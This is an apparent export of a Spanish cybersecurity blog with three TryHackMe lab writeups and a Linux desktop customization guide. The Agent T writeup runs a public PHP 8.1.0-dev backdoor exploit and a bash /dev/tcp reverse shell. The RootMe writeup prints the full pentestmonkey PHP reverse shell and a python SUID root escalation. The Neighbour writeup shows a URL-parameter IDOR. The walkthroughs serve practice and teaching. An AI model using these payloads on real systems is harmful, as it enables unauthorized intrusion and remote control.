[{"content":"En este writeup trabajaremos sobre la máquina Agent T, es una maquina facil y acontinuación veremos como resolverla.\nIPs Máquina atacante =\u0026gt; 10.8.46.8\nMáquina victima =\u0026gt; 10.10.255.45\nRECONOCIMIENTO El primer paso es ver si tenemos conexión con la máquina, así que haremos un ping a la máquina victima.\n➜ ping -c 1 10.10.255.45 PING 10.10.255.45 (10.10.255.45) 56(84) bytes of data. 64 bytes from 10.10.255.45: icmp_seq=1 ttl=63 time=59.6 ms --- 10.10.255.45 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 59.646/59.646/59.646/0.000 ms Al decirnos que un paquete ha sido transmitido y uno recibido sabemos que tenemos conexion con la máquina. Además sabiendo que el ttl = 63 sabemos que es una máquina linux.\nESCANEO Para escanear la máquina con el fin de ver que puertos estan abiertos usaremos la herramienta nmap.\n➜ sudo nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.255.45 PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 62 Ya tenemos informacion importante, sabemos que el puerto 80 esta abierto y que este corre un servicio http. Veamos un poco mas de información de este puerto para poder ejecutar scripts de reconocimiento, para ello volveremos a usar nmap.\n➜ sudo nmap -p80 -sV -sC 10.10.255.45 PORT STATE SERVICE VERSION 80/tcp open http PHP cli server 5.5 or later (PHP 8.1.0-dev) |_http-title: Admin Dashboard SEARCHSPLOIT Searchsploit es una herramienta muy útil y que nos puede ahorrar mucho tiempo, se usa para detectar vulnerabilidades de un servicio y version especificos.\n➜ searchsploit PHP 8.1.0-dev PHP 8.1.0-dev - \u0026#39;User-Agentt\u0026#39; Remote Code Execu | php/webapps/49933.py Vemos que nos ha detectado una vulnerabilidad crítica asi que vamos a usarla. Para tener el archivo 49933.py en nuestra máquina tenemos que ejecutar el suguiente comando:\n➜ searchsploit -m 49933 Ahora ya lo tenemos en nustra máquina, listo para usarlo.\nHACKEANDO Vamos a utilizar el script que nos hemos descargado previamente a ver que pasa.\n➜ python3 49933.py Enter the full host url: https://10.10.255.45 #https://ip_victima Interactive shell is opened on http://10.10.255.45 Can not acces tty; job crontol turned off. $ pwd /var/www/html $ cd .. $ pwd /var/www/html $ Vemos que tenemos una shell pero no podemos movernos del directorio actual asi que vamos a provar de enviar una reverseshell a nuestra maquina. Para ello vamos a ponernos en escucha por el puerto 443.\n➜ nc -nlvp 443 listening on [any] 443 .. Y desde la maquina victima ejecutamos una reverseshell en bash.\n➜ bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.46.8/443 0\u0026gt;\u0026amp;1\u0026#34; EUREKA! Ya tenemos conexión a la máquina y podemos movernos entre directorios, además si hacemos whoami vemos que somos root.\n➜ whoami root Ya solo queda encontrar la flag.txt. En esta máquina está en el directorio raíz /, pero (en la majoria) se encuentra en el directrio del usuario.\n➜ cd / ➜ ls bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var YA ESTAMOS!! Con el comando cat podemos visualizar el contenido de flag.txt.\n","permalink":"https://b3nder0n.github.io/writeups/tryhackme/agentt/","summary":"En este writeup trabajaremos sobre la máquina Agent T, es una maquina facil y acontinuación veremos como resolverla.\nIPs Máquina atacante =\u0026gt; 10.8.46.8\nMáquina victima =\u0026gt; 10.10.255.45\nRECONOCIMIENTO El primer paso es ver si tenemos conexión con la máquina, así que haremos un ping a la máquina victima.\n➜ ping -c 1 10.10.255.45 PING 10.10.255.45 (10.10.255.45) 56(84) bytes of data. 64 bytes from 10.10.255.45: icmp_seq=1 ttl=63 time=59.6 ms --- 10.10.255.45 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 59.","title":"Agent T"},{"content":"En este writeup trabajaremos sobre la máquina Neighbour, es una maquina facil y a continuación veremos como resolverla.\nIPs Máquina atacante =\u0026gt; 10.8.46.8\nMáquina victima =\u0026gt; 10.10.3.73\nRECONOCIMIENTO El primer paso es ver si tenemos conexión con la máquina, así que haremos un ping a la máquina victima.\n➜ ping -c 1 10.10.3.73 PING 10.10.3.73 (10.10.3.73) 56(84) bytes of data. 64 bytes from 10.10.3.73: icmp_seq=1 ttl=63 time=66.8 ms --- 10.10.3.73 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 66.802/66.802/66.802/0.000 ms Al decirnos que un paquete ha sido transmitido y uno recibido sabemos que tenemos conexion con la máquina. Además sabiendo que el ttl = 63 sabemos que es una máquina linux.\nESCANEO Para escanear la máquina con el fin de ver que puertos estan abiertos usaremos la herramienta nmap.\n➜ sudo nmap -p- --min-rate 5000 --open -sS -n -vvv -Pn 10.10.3.73 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 62 Ya tenemos informacion importante, sabemos que el puerto 80 esta abierto y que este corre un servicio http. Además sabemos que el puerto 22 esta abierto y corre un servicio SSH. Como este puerto es muy generalizado y casi nunca hay algo en especifico vamos a saltarnos un nmap mas avanzado ya que la propia máquina dice que la vulnerabilidad está en la web.\nHACKEANDO Vamos a meternos en la pagina web a ver que hay. Para ello solamente ponemos la IP de la máquina en el buscador.\nAl entar vemos esto en la página:\nPodemos ver que debajo del login hay un mensaje que dice \u0026ldquo;Don\u0026rsquo;t have an account? Use the guest account! (Ctrl+U)\u0026rdquo;. Vamos a hacer caso y a hacer un ctrl + U para ver el codigo.\nSi nos fijamos, vemos una linia que literalmente nos da las credenciales de un usuario, en este caso el \u0026ldquo;Guest\u0026rdquo;, las credenciales son guest como usuario y contraseña.\nSi nos fijamos en la URL sale lo siguiente: http://10.10.3.73/profile.php?user=guest. Esa es la vulnerabilidad, si cambiamos el nombre de usuario en la URL obtenemos el perfil de ese usuario.\nAsi que para obtener la FLAG cambiamos user=guest por user=admin.\nYa tenemos la FLAG!! Ahora simplemente la introducimos en Try Hack Me.\n","permalink":"https://b3nder0n.github.io/writeups/tryhackme/neighbour/","summary":"En este writeup trabajaremos sobre la máquina Neighbour, es una maquina facil y a continuación veremos como resolverla.\nIPs Máquina atacante =\u0026gt; 10.8.46.8\nMáquina victima =\u0026gt; 10.10.3.73\nRECONOCIMIENTO El primer paso es ver si tenemos conexión con la máquina, así que haremos un ping a la máquina victima.\n➜ ping -c 1 10.10.3.73 PING 10.10.3.73 (10.10.3.73) 56(84) bytes of data. 64 bytes from 10.10.3.73: icmp_seq=1 ttl=63 time=66.8 ms --- 10.10.3.73 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 66.","title":"Neighbour"},{"content":"¿Quieres tener un entorno como este?\nb3nder0n d3b0o Bien, no es tarea fácil, hay que ponerle ganas y no rendirse. En este post te enseñaré como paso a paso y si lo lees podrás salir de aquí con capacidad suficiente como para crear el tuyo propio.\nPAQUETES NECESARIOS Empezaremos haciendo un update e instalando los paquetes necesarios.\nsudo apt update \u0026amp;\u0026amp; sudo apt install build-essential git vim xcb libxcb-util0-dev libxcb-ewmh-dev libxcb-randr0-dev libxcb-icccm4-dev libxcb-keysyms1-dev libxcb-xinerama0-dev libasound2-dev libxcb-xtest0-dev libxcb-shape0-dev rofi BSPWM \u0026amp; SXHKD Bspwm es un gestor de ventanas, personalmente me gusta mucho porque es de tipo mosaico, es decir que las ventanas se abren ocupando toda la pantalla y se van redimensionando según la cantidad de ventanas.\nPara instalarlo tendremos que movernos a \u0026ldquo;Descargas\u0026rdquo; (si tienes el lenguaje en inglés en \u0026ldquo;Downloads\u0026rdquo;).\ncd /home/tu_usuario/Descargas/ git clone https://github.com/baskerville/bspwm.git cd bspwm/ make sudo make install sudo apt install bspwm Sxhkd se utiliza para configurar los atajos del teclado que nos servirán para abrir procesos o ejecutar programas.\nNuevamente, para instalarlo tendremos que ir al directorio \u0026ldquo;Descargas\u0026rdquo;. I ejecutar los siguientes comandos.\ncd /home/tu_usuario/Descargas/ git clone https://github.com/baskerville/sxhkd.git cd sxhkd make sudo make install En este punto crearemos las carpetas para la configuración de ambos y pegaremos los archivos de configuración.\nmkdir ~/.config/bspwm mkdir ~/.config/sxhkd cd /home/usuario/Descargas/bspwm cp examples/bspwmrc ~/.config/bspwm chmod +x ~/.config/bspwm/bspwmrc cp esxamples/sxhkdrc ~/.config/sxhkd Ahora abriremos el sxhkd y le configuraremos los atajos. (Debajo del documento explico todos).\nnano ~/.config/sxhkd/sxhkdrc Borramos todo el contenido i pegamos lo siguiente:\n# wm independent hotkeys # # terminal emulator super + Return gnome-terminal # program launcher super + d rofi -show run # make sxhkd reload its configuration files: super + Escape pkill -USR1 -x sxhkd # # bspwm hotkeys # # quit/restart bspwm super + alt + {q,r} bspc {quit,wm -r} # close and kill super + {_,shift + }w bspc node -{c,k} # alternate between the tiled and monocle layout super + m bspc desktop -l next # send the newest marked node to the newest preselected node super + y bspc node newest.marked.local -n newest.!automatic.local # swap the current node and the biggest node super + g bspc node -s biggest # # state/flags # # set the window state super + {t,shift + t,s,f} bspc node -t {tiled,pseudo_tiled,floating,fullscreen} # set the node flags super + ctrl + {m,x,y,z} bspc node -g {marked,locked,sticky,private} # # focus/swap # super + {_,shift + }{Left,Down,Up,Right} bspc node -{f,s} {west,south,north,east} # focus the node for the given path jump super + {p,b,comma,period} bspc node -f @{parent,brother,first,second} # focus the next/previous node in the current desktop super + {_,shift + }c bspc node -f {next,prev}.local # focus the next/previous desktop in the current monitor super + bracket{left,right} bspc desktop -f {prev,next}.local # focus the last node/desktop super + {grave,Tab} bspc {node,desktop} -f last # focus the older or newer node in the focus history super + {o,i} bspc wm -h off; \\ bspc node {older,newer} -f; \\ bspc wm -h on # focus or send to the given desktop super + {_,shift + }{1-9,0} bspc {desktop -f,node -d} \u0026#39;^{1-9,10}\u0026#39; # # preselect # # preselect the direction super + ctrl + alt + {Left,Down,Up,Right} bspc node -p {west,south,north,east} # preselect the ratio super + ctrl + {1-9} bspc node -o 0.{1-9} # cancel the preselection for the focused node super + ctrl + space bspc node -p cancel # cancel the preselection for the focused desktop super + ctrl + alt + space bspc query -N -d | xargs -I id -n 1 bspc node id -p cancel # # move/resize # # expand a window by moving one of its side outward #super + alt + {h,j,k,l} # bspc node -z {left -20 0,bottom 0 20,top 0 -20,right 20 0} # contract a window by moving one of its side inward #super + alt + shift + {h,j,k,l} # bspc node -z {right -20 0,top 0 20,bottom 0 -20,left 20 0} # move a floating window super + ctrl + {Left,Down,Up,Right} bspc node -v {-20 0,0 20,0 -20,20 0} # Custom move/resize alt + super + {Left,Down,Up,Right} /home/tu_usuario/.config/bspwm/scripts/bspwm_resize {west,south,north,east} Crearemos el archivo \u0026ldquo;bspwm_resize\u0026rdquo; para en un futuro controlar las dimensiones de las ventanas.\nmkdir ~/.config/bspwm/scripts/ touch ~/.config/bspwm/scripts/bspwm_resize; chmod +x ~/.config/bspwm/scripts/bspwm_resize Lo abriremos con \u0026rsquo;nano ~/.config/bspwm/scripts/bspwm_resize\u0026rsquo;, borarremos el contenido y pegaremos el siguiente:\n#!/usr/bin/env dash if bspc query -N -n focused.floating \u0026amp;gt; /dev/null; then step=20 else step=100 fi case \u0026#34;$1\u0026#34; in west) dir=right; falldir=left; x=\u0026#34;-$step\u0026#34;; y=0;; east) dir=right; falldir=left; x=\u0026#34;$step\u0026#34;; y=0;; north) dir=top; falldir=bottom; x=0; y=\u0026#34;-$step\u0026#34;;; south) dir=top; falldir=bottom; x=0; y=\u0026#34;$step\u0026#34;;; esac bspc node -z \u0026#34;$dir\u0026#34; \u0026#34;$x\u0026#34; \u0026#34;$y\u0026#34; || bspc node -z \u0026#34;$falldir\u0026#34; \u0026#34;$x\u0026#34; \u0026#34;$y\u0026#34; # PUNTO IMPORTANTE! En este punto tenemos que reiniciar, podemos usar el comando \u0026lsquo;sudo reboot\u0026rsquo; la máquina. Cuando vayamos a elegir nuestro usuario tendremos que cambiar nuestro escritorio por bspwm.\nCuando se inicie es normal que solo se vea una pantalla en negro o una foto del sistema operativo, no os preocupéis, si habéis configurado bien el sxhkdrc al hacer \u0026lsquo;win + enter\u0026rsquo; se abrirá una terminal, desde ella operaremos. Si necesitáis abrir cualquier otro programa hacemos \u0026lsquo;win + d\u0026rsquo; y se nos abrirá el menú de aplicaciones.\nPOLYBAR Ahora instalaremos la Polybar, Polybar es una herramienta rápida y sencilla de utilizar que permitirá crear tus barras de estado. Una barra de estado no es más que un elemento gráfico en el que se muestra información sobre el sistema. O en el caso de Polybar, lo que tú quieras mostrar.\nPara instalarla primero instalaremos los paquetes necesarios.\nsudo apt install cmake cmake-data pkg-config python3-sphinx libcairo2-dev libxcb1-dev libxcb-util0-dev libxcb-randr0-dev libxcb-composite0-dev python3-xcbgen xcb-proto libxcb-image0-dev libxcb-ewmh-dev libxcb-icccm4-dev libxcb-xkb-dev libxcb-xrm-dev libxcb-cursor-dev libasound2-dev libpulse-dev libjsoncpp-dev libmpdclient-dev libcurl4-openssl-dev libnl-genl-3-dev Ahora instalaremos la Polybar, para ello ejecutaremos los siguientes comandos.\ncd /home/tu_usuario/Descargas/ git clone --recursive https://github.com/polybar/polybar cd polybar/ mkdir build cd build/ cmake .. make -j$(nproc) sudo make install Yo he usado como base la polybar del pana adi190x, me parecen de las mejores, si ya te gusta alguna la puedes poner.\ngit clone --depth=1 https://github.com/adi1090x/polybar-themes.git cd polybar-themes chmod +x setup.sh Luego solo queda ejecutar\n./setup.sh [*] Installing Polybar Themes... [*] Choose Style - [1] Simple [2] Bitmap [?] Select Option : 1 [*] Installing fonts... [*] Creating a backup of your polybar configs... [*] Successfully Installed. Para elegir la polybar que queramos hemos de ejecutar la siguiente linia.\nbash ~/.config/polybar/launch.sh Veremos un listado de todas las polybars disponibles, podemos ir testeando con el parámetro \u0026lsquo;\u0026ndash; \u0026lt;nombre\u0026gt;\u0026rsquo;. Por ejemplo:\nbash ~/.config/polybar/launch.sh -- hack En mi caso trabajaremos sobre \u0026lsquo;\u0026ndash; forest\u0026rsquo;.\nUna vez hayamos ejecutado el comando veremos la polybar tal que así:\n¡YA HEMOS HECHO UN MUY BUEN TRABAJO!!!!\nPero aún nos queda personalizarlo un poco.\nPUNTO IMPORTANTE!! ¡Si quieres entender como funciona la polybar y poder ser un experto, lee esto con atencion!\nLo primero es entender lo siguiente: Esto es lo que hace cada archivo en el directorio \u0026lsquo;~/.config/polybar\u0026rsquo;\nPrincipales configuraciones de los módulos.\nPerfecto, ahora que ya sabemos esto vamos a configurar nuestra polybar al gusto.\nPara acceder a mis dotfiles hay que ir al siguiente enlace dotfiles. Para aplicar la configuración ejecutaremos los siguientes comandos.\ncd ~/Descargas cd .config mv bin ~/.config/ sudo rm -r /home/tu_usuario/.config/polybar mv polybar ~/.config/ cd ~/.config/bin chmod +x \u0026amp;gt; Ahora tendríamos que poner nuestra polybar en el archivo \u0026lsquo;bspwmrc\u0026rsquo; para que cada vez que iniciemos bspwm salga la polybar. Para ello ejecutaremos el siguiente comando.\nnano ~/.config/bspwm/bspwmrc # PEGAMOS LA SIGUIENTE LÍNEA DONDE QUERAMOS bash ~/.config/polybar/launch.sh --forest # Yo uso la forest. Hacemos \u0026lsquo;win + alt + r\u0026rsquo; y en principio veríamos ya nuestra polybar configurada.\nFONDO DE PANTALLA Este es uno de los procesos más raros, lo que sería en Windows o en otro Linux hacer un clic derecho en la imagen y convertirla en fondo de pantalla aquí se complica un poquito.\nPrimero tendríamos que tener una imagen descargada, preferiblemente en el directorio \u0026lsquo;Imágenes\u0026rsquo;, luego tendríamos que ejecutar el siguiente comando.\nsudo apt install feh # Si no lo instala quiere decir que ya lo tenemos. feh --bg-fill /home/tu_usuario/Imágenes/tu_foto.loquesea Con este comando ya nos tendría que aparecer el fondo de pantalla. Nuevamente, tendríamos que incorporar la linia en el \u0026lsquo;bspwm\u0026rsquo;, sería igual que lo de la polybar.\nFUNCION SETTARGET Ya está casi todo, quedaría configurar unas funciones y cuatro cosas más.\nLo primero, veremos que en la polybar sale un módulo llamado \u0026lsquo;Lost Target\u0026rsquo;, este módulo nos sirve para tener nuestro objetivo siempre visible, para que sea funcional hay que seguir una serie de pasos.\n1- Tenemos que crear un archivo en el directorio \u0026lsquo;/home/tu_usuario\u0026rsquo;, el archivo se llamará \u0026rsquo;target.txt\u0026rsquo;\n2- Tenemos que editar el archivo \u0026lsquo;/home/tu_usuario/.config/bin/copyiptarget.sh\u0026rsquo; y cambiar la línea que dice /home/aaron/target.txt por /home/tu_usuario/target.txt.\n3- En nuestro archivo \u0026lsquo;.zshrc\u0026rsquo; que se encuentra en el directorio \u0026lsquo;/home/tu_usuario\u0026rsquo;hemos de añadir la siguiente linia:\nfunction settarget(){ ip_address=$1 machine_name=$2 echo \u0026#34;$ip_address $machine_name\u0026#34; \u0026amp;gt; /home/tu_usuario/target.txt } 4- Cuando en la terminal ejecutemos el comando \u0026lsquo;settarget\u0026rsquo; se nos pondra en la polybar.\n5- La estructura del comando es la siguiente \u0026lsquo;settarget \u0026lt;ip\u0026gt; \u0026lt;nombre\u0026gt;\u0026rsquo;, un ejemplo sería \u0026lsquo;settarget 127.0.0.1 Localhost\u0026rsquo;.\nOH-MY-ZSH Para tener un tema personalizado en nuestra terminal podemos hacer uno de oh-my-zsh. Si lo quieres descargar ves a la página oficial y sigue los pasos, a continuación te dejo el enlace: Oh-my-zsh\nFINAL ¡PUES ESTO ES TODO! Espero que os sirva de ayuda y que podáis configurar vuestro entrono Linux sin ningún problema, cualquier duda o problema contáctame por mis redes sociales.\n¡¡¡¡QUE DISFRUTÉIS DEL ENTRONO!!!!\n","permalink":"https://b3nder0n.github.io/linux/personalizar_entorno/","summary":"¿Quieres tener un entorno como este?\nb3nder0n d3b0o Bien, no es tarea fácil, hay que ponerle ganas y no rendirse. En este post te enseñaré como paso a paso y si lo lees podrás salir de aquí con capacidad suficiente como para crear el tuyo propio.\nPAQUETES NECESARIOS Empezaremos haciendo un update e instalando los paquetes necesarios.\nsudo apt update \u0026amp;\u0026amp; sudo apt install build-essential git vim xcb libxcb-util0-dev libxcb-ewmh-dev libxcb-randr0-dev libxcb-icccm4-dev libxcb-keysyms1-dev libxcb-xinerama0-dev libasound2-dev libxcb-xtest0-dev libxcb-shape0-dev rofi BSPWM \u0026amp; SXHKD Bspwm es un gestor de ventanas, personalmente me gusta mucho porque es de tipo mosaico, es decir que las ventanas se abren ocupando toda la pantalla y se van redimensionando según la cantidad de ventanas.","title":"PERSONALIZAR ENTORNO LINUX"},{"content":"En este writeup trabajaremos sobre la máquina RootMe, es una maquina facil y acontinuación veremos como resolverla.\nIPs Maáuina atacante =\u0026gt; 10.8.46.8\nMáquina victima =\u0026gt; 10.10.84.238\nRECONOCIMIENTO El primer paso es ver si tenemos conexión con la máquina, así que haremos un ping a la máquina victima.\n➜ ping -c 1 10.10.84.238 PING 10.10.216.249 (10.10.216.249) 56(84) bytes of data. 64 bytes from 10.10.216.249: icmp_seq=1 ttl=63 time=79.7 ms --- 10.10.84.238 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 79.676/79.676/79.676/0.000 ms Al decirnos que un paquete ha sido transmitido y uno recibido sabemos que tenemos conexion con la máquina. Además sabiendo que el ttl = 63 sabemos que es una máquina linux.\nESCANEO Para escanear la máquina con el fin de ver que puertos estan abiertos usaremos la herramienta nmap.\n➜ sudo nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.84.238 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Ya tenemos informacion importante, sabemos que el puerto 80 esta abierto y que este corre un servicio http. Y sabemos que el puerto 22 está abierto y que este corre un servicio ssh.\nVeamos un poco mas de información de estos puertos para poder ejecutar scripts de reconocimiento. Para ello volveremos a usar nmap.\n➜ sudo nmap -p22,80 -sC -sV 10.10.84.238 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4ab9160884c25448ba5cfd3f225f2214 (RSA) | 256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA) |_ 256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: HackIT - Home | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel HACKEANDO Vamos a empezar el proceso mas divertido, vulnerar la máquina para ello seguiremos una serie de pasos que a continuación están explicados.\nOBSERVANDO Vamos a ver como se ve la WEB que se está ejecutando en el puerto 80. Para ello ponemos la IP de la máquina en el buscador de google.\nAl entrar solo vemos esto:\nSUBDIRECTORIOS Como no vemos nada más en la página web vamos a aplicar una búsqueda de subdirectorios con wfuzz.\n➜ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.84.238/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000552: 301 9 L 28 W 310 Ch \u0026#34;css\u0026#34; 000000955: 301 9 L 28 W 309 Ch \u0026#34;js\u0026#34; 000005522: 301 9 L 28 W 312 Ch \u0026#34;panel\u0026#34; 000000166: 301 9 L 28 W 314 Ch \u0026#34;uploads\u0026#34; Podemos ver que hay un subdirectorio llamado panel, vamos a mirar que hay dentro.\nPonemos en la URL /panel, quedaria así : http://10.10.84.238/panel/.\nPodemos ver que en este sitio se pueden subir archivos, vamos a intentar subir una reverse shell en PHP. Para ello crearemos un archivo llamado php-reverse-shell.phtmlque contendrá lo siguiente:\n\u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP // Copyright (C) 2007 pentestmonkey@pentestmonkey.net // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. The author accepts no liability // for damage caused by this tool. If these terms are not acceptable to you, then // do not use this tool. // // In all other respects the GPL version 2 applies: // // This program is free software; you can redistribute it and/or modify // it under the terms of the GNU General Public License version 2 as // published by the Free Software Foundation. // // This program is distributed in the hope that it will be useful, // but WITHOUT ANY WARRANTY; without even the implied warranty of // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the // GNU General Public License for more details. // // You should have received a copy of the GNU General Public License along // with this program; if not, write to the Free Software Foundation, Inc., // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. If these terms are not acceptable to // you, then do not use this tool. // // You are encouraged to send comments, improvements or suggestions to // me at pentestmonkey@pentestmonkey.net // // Description // ----------- // This script will make an outbound TCP connection to a hardcoded IP and port. // The recipient will be given a shell running as the current user (apache normally). // // Limitations // ----------- // proc_open and stream_set_blocking require PHP version 4.3+, or 5+ // Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Wi\u0026gt; // Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely availabl\u0026gt; // // Usage // ----- // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck. set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;Nuestra_IP\u0026#39;; // CHANGE THIS $port = \u0026#39;puerto \u0026#39;; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } // Change to a safe directory chdir(\u0026#34;/\u0026#34;); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } // Spawn shell process $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won\u0026#39;t stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process\u0026#39;s STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } // If we can read from the process\u0026#39;s STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we\u0026#39;ve daemonised ourself // (I can\u0026#39;t figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; Ya estaría niestro archivo, quedaria cambiar el parametro del puerto y de la IP a los niestros, yo por ejemplo tengo que poneri de IP la 10.10.46.8 y de puerto el 443.\nVamos a ponernos por escucha en el puerto 443 desde nuetra terminal:\n➜ nc -nlvp 443 Y ahora subiremos el archivo a la página web.\nVemos que se ha subido correctamente, pero si nos fijamos en nuestra terminal todavia no sale nada:\nnc -nlvp 443 listening on [any] 443 ... Eso es porque el archivo se ha subido pero no se ha ejecutado, si nos acordamos el wfuzz nos ha dado previamente un directorio /uploads.\n000000166: 301 9 L 28 W 314 Ch \u0026#34;uploads\u0026#34; Si nos movemos a la URL http://10.10.84.238/uploads veremos lo siguiente:\nVamos a hacer clic en nuestro archivo. Aparentemente no ha sucedido nada pero vamos a fijarnos en nuestra terminal:\nLinux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 14:33:41 up 1:05, 0 users, load average: 0.00, 0.00, 0.56 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ EUREKA!!! Estamos conectados a la máquina, pero todavia no hemos acabado.\nVamos a realizar un tratamiento de la tty para poder operar mas comodamente.\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Ahora tendriamos que ver algo así:\nwww-data@rootme:/$ Para encontrar la bandera de usuario vamos a ponernos en el directorio /var/www.\nwww-data@rootme:/$ cd /var/www www-data@rootme:/var/www$ cat user.txt ******************** www-data@rootme:/var/www$ Despés de buscar durante bastante, me di cuenta que en historial hay un comando un tanto extraño, lo podemos ver usando el comando history.\npython -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; Vamos a probar de poner este comando.\nwww-data@rootme:/var/www$ python -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; # whoami root # YA ESTAA!!! Si hacemos el comando whoami podremos ver que somos root. Ahora solo queda encontrar la bandera de root que en este caso está en /root.\n# cat /root/root.txt ************************* # Y esto seria la resolución de la máquina RootMe, espero que os sirva de soporte por si os quedais estancados.\n","permalink":"https://b3nder0n.github.io/writeups/tryhackme/rootme/","summary":"En este writeup trabajaremos sobre la máquina RootMe, es una maquina facil y acontinuación veremos como resolverla.\nIPs Maáuina atacante =\u0026gt; 10.8.46.8\nMáquina victima =\u0026gt; 10.10.84.238\nRECONOCIMIENTO El primer paso es ver si tenemos conexión con la máquina, así que haremos un ping a la máquina victima.\n➜ ping -c 1 10.10.84.238 PING 10.10.216.249 (10.10.216.249) 56(84) bytes of data. 64 bytes from 10.10.216.249: icmp_seq=1 ttl=63 time=79.7 ms --- 10.10.84.238 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 79.","title":"RootMe"},{"content":"Mi nombre es b3nder0n y me mola mucho la ciberseguridad. He creado este post para que a aquellos a los que tambien les apasione este mundo tengan un soporte para empezar, desde como personalizar Linux hasta resolucion de maquinas avanzadas en 